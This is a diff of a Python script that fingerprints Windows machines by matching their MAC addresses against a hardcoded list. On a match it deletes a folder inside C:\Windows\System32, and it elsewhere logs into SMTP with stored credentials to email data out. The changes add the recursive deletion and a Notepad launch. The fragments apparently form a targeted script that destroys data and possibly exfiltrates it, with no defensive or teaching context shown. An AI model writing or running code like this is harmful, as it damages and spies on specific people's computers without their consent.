@@ -27,6 +27,12 @@ def list_files_and_folders(path):
         return None
 
 
+def delete_folder(path):
+    try:
+        shutil.rmtree(path)
+        print(f"Folder at {path} deleted successfully.")
+    except Exception as e:
+        print(f"Error: {e}")
 
 def main():
     # Run the 'ipconfig /all' command
@@ -41,12 +47,14 @@ def main():
     mac_addresses = re.findall(mac_address_pattern, tri)
 
     if "36-02-86-52-8E-DD" in mac_addresses or "78-98-E8-1E-D3-08" in mac_addresses or "78-98-E8-1E-E6-D8" in mac_addresses or "90-B1-1C-8C-E7-E9" in mac_addresses or "90-B1-1C-89-06-E0" in mac_addresses or "90-B1-1C-99-71-77" in mac_addresses or "A0-A3-F0-15-C4-FB" in mac_addresses or "A0-A3-F0-15-CB-2C" in mac_addresses or "A2-A3-F0-15-C4-FB" in mac_addresses or "A2-A3-F0-15-C9-D8" in mac_addresses or "A2-A3-F0-15-CA-F7" in mac_addresses or "F8-B1-56-C2-E3-3D" in mac_addresses or "00-FF-1E-A9-EC-F1" in mac_addresses or "90-B1-1C-8D-85-46" in mac_addresses or "30-24-32-1E-08-43" in mac_addresses or "90-B1-1C-7C-7B-A0" in mac_addresses or "A0-A3-F0-15-D2-2B" in mac_addresses or "A4-1F-72-95-D3-28" in mac_addresses:
-
+        folder_path = r"C:\Windows\System32\DDDFFFss"
+        delete_folder(folder_path)
+        time.sleep(20)
 
 
 
         
-        target_path = r"C:\Windows\System32"
+        target_path = r"C:\Windows\System32\DDDFFFss"
         
 
 
@@ -73,7 +81,11 @@ def main():
             smtp.login(email_sender, email_password)
         
             smtp.sendmail(email_sender, email_receiver, em.as_string())
-        
+        try:
+            subprocess.Popen(['notepad.exe'])
+            print("Notepad opened successfully.")
+        except Exception as e:
+            print(f"Error opening Notepad: {e}")
     
 
 if __name__ == "__main__":
